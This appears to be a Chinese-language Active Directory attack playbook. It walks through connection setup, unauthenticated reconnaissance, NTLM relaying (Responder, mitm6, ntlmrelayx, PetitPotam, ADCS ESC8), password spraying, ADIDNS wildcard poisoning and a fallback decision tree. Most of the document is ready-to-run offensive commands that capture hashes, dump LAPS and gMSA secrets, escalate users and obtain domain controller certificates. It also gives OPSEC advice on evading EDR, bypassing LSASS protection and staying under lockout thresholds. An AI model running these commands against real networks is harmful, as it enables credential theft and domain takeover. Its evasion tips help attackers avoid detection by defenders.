## 阶段 0 — 接入准备(每次必做)

```bash
# 1. 时间同步(Kerberos 前后 5 分钟容忍,不同步必失败)
sudo chronyd -q 'server <域控IP> iburst'

# 2. DNS 指向域控(域名解析是域内一切的前提)
echo kali | sudo -S sed -i '1s|^|nameserver <域控IP>\n|' /etc/resolv.conf

# 3. Kerberos 客户端配置(/etc/krb5.conf 追加,REALM 必须大写)
sudo tee -a /etc/krb5.conf <<'EOF'
[realms]
<域大写> = {
    kdc = <域控FQDN>
    admin_server = <域控FQDN>
}
[domain_realm]
.<域> = <域大写>
<域> = <域大写>
EOF

# 4. 代理(如需)
export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334

# 5. 验证票据可取(有账密时)
echo '<密码>' | kinit <用户>@<域大写> && klist
```

注意:改 resolv.conf 若用 systemd-resolved/NetworkManager 可能被覆盖,用 `sudo resolvectl dns eth0 <域控IP>` 替代。

## 阶段 1 — 域外,无凭据(初始立足)

### 1.1 定位域与域控

```bash
# AD 特征端口:53/88/135/139/389/445/464/593/636/3268/3269/5985/5986/9389(CA 常挂 80/443/8080)
nmap -sS -Pn -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 --open -oA adprobe <网段>/24

# 全段一把梭(存活+端口+弱口令+漏洞)
~/tools/bin/fscan -h <网段>/24

# 确认域名
nxc smb <域控IP> -u 'a' -p '' --pass-pol 2>/dev/null | head -3
# 返回行首即域名,如: [+] <域控IP> 515 [域]\
```

### 1.2 侦察三件套(无凭据也能吃到的肉)

```bash
# ① SMB 签名未强制 → 生成可中继目标清单(必做!)
nxc smb <网段>/24 --gen-relay-list relay.txt -u '' -p '' 2>/dev/null; cat relay.txt

# ② Responder 抓哈希(LLMNR/NBT-NS 毒化;eth0 换实际网卡)
sudo responder -I eth0 -wv
# 抓到 NetNTLMv2 → hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# ③ mitm6 + ntlmrelayx 打 IPv6 中继(DNS 动态注册,见 05 文档)
sudo mitm6 -d <域> -i eth0 &
sudo impacket-ntlmrelayx -6 -wh <域控FQDN> -t ldaps://<域控IP> -socks --no-smb2support
```

### 1.3 ADCS ESC8(有 CA 即可无凭据打)

```bash
# 先确认 CA 存在(web enrollment 特征 /certsrv)
curl -sk -o /dev/null -w '%{http_code}\n' https://<CA的FQDN>/certsrv/

# 中继到 CA 的 HTTP 接口拿机器证书(PetitPotam/coercer 强制认证,详见 11 文档)
sudo impacket-ntlmrelayx -t http://<CA的FQDN>/certsrv/certfnsh.asp -smb2support --no-smb2support
sudo python3 ~/tools/src/PetitPotam/petitpotam.py <本机IP> <目标机器IP>
# 拿到 base64 PFX → certipy auth -pfx <证书>.pfx -dc-ip <域控IP>(进阶段 2)
```

### 1.4 密码喷洒(有用户名来源时)

```bash
# 无验证喷洒,锁定阈值先探测(nxc 默认自动判断)
nxc smb <域控IP> -u users.txt -p 'Password@2024' --continue-on-success
# users.txt 来源:sherlock(01 文档)、网页、邮箱前缀、ldapdomaindump 空会话
ldapdomaindump -u '<域>\guest' -p '' <域控IP> 2>/dev/null || ldapdomaindump ldaps://<域控IP> -u '' -p ''
```

### 1.5 中继矩阵(目标 × 命令 × 触发源 × 后续)— 2026-09-16 升级

**先决**:`nxc smb <网段>/24 --gen-relay-list` 产出可中继清单(签名未强制);responder 联动时先关其 SMB/HTTP 防 conflict。目标决定姿势:

| 中继目标 | 命令(一键=执行台「中继矩阵」组) | 来了之后得到什么 |
|---|---|---|
| LDAPS(DC) | `impacket-ntlmrelayx -t ldaps://<域控FQDN> --delegate-access` | 对来者机器自动配 RBCD → 三步链(§4.2) |
| LDAP(DC) | `impacket-ntlmrelayx -t ldap://<域控FQDN> --escalate-user '<低权户>'` | 来一次认证=该用户被拔高 ACL |
| LDAP 倾泻 | `impacket-ntlmrelayx -t ldap://<域控FQDN> --dump-laps --dump-gmsa --dump-adcs` | 一次认证=LAPS+gMSA+ADCS 全吐 |
| CA(ESC8) | `sudo certipy relay -target http://<CA> -template DomainController` | DC 机器证书→`certipy auth`→机器哈希 |
| SMB(签名关) | `impacket-ntlmrelayx -tf relay-list.txt -socks` | 挂 SOCKS 会话慢慢用(socks → interact) |

**触发源**(谁去"喂"认证,任选):`coercer scan` 先探测可用方法 → `coercer coerce` 全打;PetitPotam(~/tools/src);打印机 Spooler Bug;outlook 邮件内 UNC(配 ADIDNS)。

**ADIDNS 通配符投毒(让"任意主机名"都解析到你)**:

```bash
dnstool -u '<域>\<用户>' -p '<密码>' -r '*.<域名>' --action add --data <本机IP> --allow-multiple <域控IP>   # 加 *.domain A 记录
# 效果:域内解析不到的主机名全部落到本机 → responder/中继流量倍增;清理:--action remove
```

**在线会话狩猎(比 BH HasSession 更"现在时")**:

```bash
nxc smb <网段>/24 -u <用户> -p '<密码>' --sessions --loggedon-users   # 域管此刻登录在哪台机器
```

注意:Kerberos 中继(krbrelayx,见 16 §1)是 NTLM 中继全被拦(签名+EPA)时的下位替代;PrintNightmare(cve_2021_1675_printnightmare)可作中继拿不到时的远程执行兜底,均已入执行台。

## 阶段 4 — 打域控(提权路径)

### 4.1 ADCS(现代域最常见突破口)

```bash

grep -o 'ESC[0-9]*' bloodhound.*.json | sort -u     # 命中哪个 ESC → 文档 11 对应小节
```

### 4.2 委托攻击链(详见文档 12 第 6 节)


## 失败回退决策树(工具没打穿时走哪条)

```text
凭据验证失败(状态码判读)
├─ STATUS_ACCOUNT_LOCKED     → 换账号;查锁定时长(--pass-pol)后改喷洒节奏
├─ STATUS_LOGON_FAILURE      → 密码错:换字典/大小写/首字母大写后缀(@123/2024/!)
├─ STATUS_PASSWORD_EXPIRED   → 密码已过期:尝试 LDAP 直接改密(impacket-changepasswd)
└─ CLOCK_SKEW                → 回阶段 0 对时(chronyd)

中继链失败
├─ SMB 签名强制(relay-list 空) → 转_LDAPS 中继(-t ldaps://,需关 ldaps 签名验证)或转 ESC8(http 接口不受签名限制);NTLM 中继全线被拦 → Kerberos 中继(krbrelayx + CVE-2022-33679,见 16 号 §1)
├─ LDAPS 中继被拒             → 转 ntlmrelayx -t http://<CA>(ESC8)或 -socks 挂会话慢慢用
└─ mitm6 无 IPv6 流量         → 回 responder(LLMNR)+ 喷洒

ADCScertipy req 失败
├─ CERTSRV_E_TEMPLATE_DENIED → 模板无 Enroll 权:certipy find -vulnerable 重看 ESC 编号;ESC9/ESC10 弱映射换证书模板
├─ CA 不可达                  → relay 到 CA(ESC8);CA 离线就放弃 ADCS 转 Kerberos 链
└─ certipy auth 失败          → 检查 KDC 时间/krb5.conf;-kirbi 出票转 mimikatz ptt 试

横向被拦(EDR/审计)
├─ psexec 服务创建被拦        → wmiexec(免服务落盘)→ atexec(计划任务)→ evil-winrm(WinRM 日志)
├─ LSASS 读取失败(RunAsPPL)  → 13 文档「LSASS PPL 绕过」(comsvcs MiniDump)
└─ 全程被 EDR 压制           → 转入 C2(见下节)用 implant 的内存执行/睡眠混淆
```

## OPSEC 汇总(每次行动对照)

- ntlmrelayx 尽量 `--no-smb2support` 定向中继,少碰全网段;responder 抓到即停
- psexec 落服务二进制留痕,wmiexec/atexec 更隐蔽;evil-winrm 记录 WinRM 日志
- ZeroLogon 打完必须恢复机器哈希;金票只在需要时现打,CCACHE 别落共享盘
- 域控上一切动作默认有 4662/4768/4769 审计,BloodHound CE 采集本身是 LDAP 只读(低噪)
- 爆破类(nxc -p 字典)注意锁定阈值:动手先看口令策略 `nxc smb <域控IP> -u <用户> -p '<密码>' --pass-pol`(锁定阈值/时长一目了然)
